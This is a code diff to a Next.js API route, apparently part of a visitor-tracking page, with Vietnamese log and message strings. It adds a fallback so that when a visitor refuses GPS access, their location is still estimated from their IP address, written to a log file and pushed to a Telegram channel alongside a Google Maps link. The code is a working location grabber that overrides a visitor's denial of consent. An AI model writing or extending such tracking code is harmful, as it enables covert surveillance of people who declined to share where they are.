@@ -3,7 +3,7 @@ import { NextResponse } from 'next/server';
 import fs from 'fs';
 import path from 'path';
 import { headers } from 'next/headers';
-import { getAddress, sendTelegramNotification } from '@/lib/server-utils';
+import { getAddress, getAddressFromIp, sendTelegramNotification } from '@/lib/server-utils';
 
 export async function POST(request: Request) {
   try {
@@ -43,10 +43,24 @@ export async function POST(request: Request) {
       logData += `Địa chỉ: ${address}\n`;
       logData += `Link Google Maps: ${maps_link}\n`;
 
-      telegramMessage += `*Vị trí:* ${address}\n`;
+      telegramMessage += `*Vị trí (GPS):* ${address}\n`;
       telegramMessage += `*Tọa độ:* \`${lat}, ${lon}\`\n`;
       telegramMessage += `*Độ chính xác:* \`${acc || 'N/A'}m\`\n`;
       telegramMessage += `*Bản đồ:* [Mở Google Maps](${maps_link})\n`;
+    } else {
+      // Fallback to IP Geolocation
+      const { address, lat: ipLat, lon: ipLon } = await getAddressFromIp(finalIp);
+      const maps_link = (ipLat && ipLon) ? `https://www.google.com/maps?q=${ipLat},${ipLon}` : 'N/A';
+
+      logData += `Tọa độ: N/A (Bị từ chối)\n`;
+      logData += `Độ chính xác: N/A\n`;
+      logData += `Địa chỉ: ${address} (Ước tính từ IP)\n`;
+      logData += `Link Google Maps: ${maps_link}\n`;
+
+      telegramMessage += `*Vị trí (IP):* ${address}\n`;
+      if (maps_link !== 'N/A') {
+        telegramMessage += `*Bản đồ (Ước tính):* [Mở Google Maps](${maps_link})\n`;
+      }
     }
     
     logData += `----------------------------------\n`;
@@ -60,7 +74,6 @@ export async function POST(request: Request) {
 
     fs.appendFileSync(logFile, logData, 'utf-8');
     
-    // Send notification without blocking
     sendTelegramNotification(telegramMessage);
     
     return NextResponse.json({ status: 'ok' });
